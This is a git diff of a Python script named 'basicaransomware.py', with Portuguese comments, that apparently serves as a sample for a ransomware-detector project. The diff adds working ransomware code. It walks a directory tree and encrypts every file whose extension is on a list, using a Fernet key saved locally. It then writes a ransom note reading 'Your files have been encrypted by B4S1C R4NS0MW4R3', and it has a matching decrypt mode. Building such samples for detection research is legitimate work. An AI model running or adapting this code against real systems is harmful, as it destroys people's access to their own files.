@@ -1,15 +1,76 @@
 import os
-from os import path
-from time import sleep
-import modules.encrypter as encrypter
-import modules.decrypter as decrypter
-import modules.key_generator as key_generator
 import argparse
-import logging
+import pathlib
+from cryptography.fernet import Fernet
 
 # Caminho teste para criptografar/descriptografar
 # python basicaransomware.py -p "/home/matheusheidemann/Documents/Python Files/Python-Ransomware-Detector/ransomware-samples/encrypt-test"
 
+
+# CLASSES
+# Classe da chave de criptografia
+class CryptoKey:
+    # Gerar uma chave de criptografia
+    def generateKey():
+        key_value = Fernet.generate_key()
+        with open('key.key', 'wb') as key_file:
+            key_file.write(key_value)
+
+    
+    # Carregar a chave de criptografia gerada
+    def loadKey():
+        return open('key.key', 'rb').read()
+
+
+# Classe das funcionalidades do Ransomware
+class Ransomware:
+    # Criar o arquivo de instruções
+    def createTxt(directory):
+        with open(directory + '/' + 'How to decrypt your files.txt', 'w') as file:
+            file.write("Your files have been encrypted by B4S1C R4NS0MW4R3 by BASH BUNNY\n")
+            file.write(f"To decrypt your files, run 'python Ransomware.py -p \" {directory} \" --decrypt'")
+
+    
+    # Deletar o arquivo de instruções
+    def deleteTxt(directory):
+        os.remove(directory + '/' + 'How to decrypt your files.txt')
+
+    
+    # Criptografar/Descriptografar os arquivos
+    def run(directory, key, action):
+        # Deletar o txt caso esteja descriptografando
+        if action == "decrypt":
+            Ransomware.deleteTxt(directory)
+
+        # Criar uma lista com as extensões de arquivos
+        file_extensions = [line.rstrip() for line in open('./modules/file_extensions.txt')]
+
+        # Pegar os arquivos recursivamente para criptografar/descriptografar
+        for current_path, _, files_in_current_path in os.walk(directory):
+            for file in files_in_current_path:
+                if pathlib.Path(file).suffix in file_extensions:
+                    file_abs_full_path = os.path.join(current_path, file)
+
+                    with open(file_abs_full_path, 'rb') as file_in_abs_path:
+                        file_data = file_in_abs_path.read()
+                        if action == "encrypt":
+                            final_data = Fernet(key).encrypt(file_data)
+                        elif action == "decrypt":
+                            final_data = Fernet(key).decrypt(file_data)
+
+                    with open(file_abs_full_path, 'wb') as file_in_abs_path:
+                        file_in_abs_path.write(final_data)
+
+         # Criar o txt caso esteja criptografando
+        if action == "encrypt":
+            Ransomware.createTxt(directory)
+
+        # Printar que teve sucesso ao criptografar/descriptografar os arquivos
+        print(f"Todos os arquivos do diretório '{directory}' e filhos foram {'criptografados' if action == 'encrypt' else 'descriptografados'} com sucesso!\n")
+
+
+# FUNÇÕES
+# Função para pegar os argumentos
 def getArguments():
     parser = argparse.ArgumentParser(description="PYTHON ARP SPOOFER - Script to spoof to targets in the same network")
     parser.add_argument("-p", "--path", action="store", help="O caminho para criptografar/descriptografar os arquivos")
@@ -22,7 +83,7 @@ def getArguments():
         print("ERRO - Você passou o argumento --encrypt e --decrypt! Por favor, use apenas um dos dois!")
         print("Finzalizando...")
         quit()
-    
+
     # Checar se o usuário não passou --encrypt ou --decrypt
     if not args.encrypt and not args.decrypt:
         print("ERRO - Você não passou o argumento --encrypt ou --decrypt! Por favor, define qual a operação que será realizada!")
@@ -39,39 +100,32 @@ def getArguments():
         print(f"ERRO! Você precisa fornecer um caminho para {'criptografar' if args.encrypt else 'descriptografar'}!")
         print("Finzalizando...")
         quit()
-    
+
     # Retornar os argumentos
     return args
 
 
+# MAIN
 if __name__ == '__main__':
     # Pegar os argumentos
     args = getArguments()
 
-    # Colocar o diretório pai em uma variável
-    directory = args.path 
-    # Listar arquivos no diretório definido (retorna uma lista com cada nome de arquivo)
-    items = os.listdir(directory)
-    # Caminho completo para criptografar/descriptografar + cada nome de arquivo
-    # O "full_path" é uma lista que conterá os items "path + cada item da lista 'items'")
-    full_path = [directory + '/' + item for item in items]
+    # O diretório que terá os arquivos criptografados/descriptografados
+    directory = args.path
 
     # Criptografar ou Descriptografar os arquivos
     # Criptografar
     if args.encrypt:
         # Gerar a chave de criptografia
-        key_generator.generateKey()
+        key = CryptoKey.generateKey()
         # Carregar a chave de criptografia
-        key = key_generator.loadKey()
+        key = CryptoKey.loadKey()
         # Criptografar os arquivos
-        encrypter.run(directory, full_path, key)
-        # Criar um arquivo informando como descriptografar os arquivos
-        # encrypter.createDecryptTxt(directory)
+        Ransomware.run(directory, key, "encrypt")
+
     # Descriptografar
     elif args.decrypt:
         # Carregar a chave de criptografia
-        key = key_generator.loadKey()
+        key = CryptoKey.loadKey()
         # Descriptografar os arquivos
-        decrypter.run(directory, full_path, key)
-        # Deletar o arquivo informando como descriptografar os arquivos
-        # decrypter.deleteDecryptTxt(directory)
+        Ransomware.run(directory, key, "decrypt")
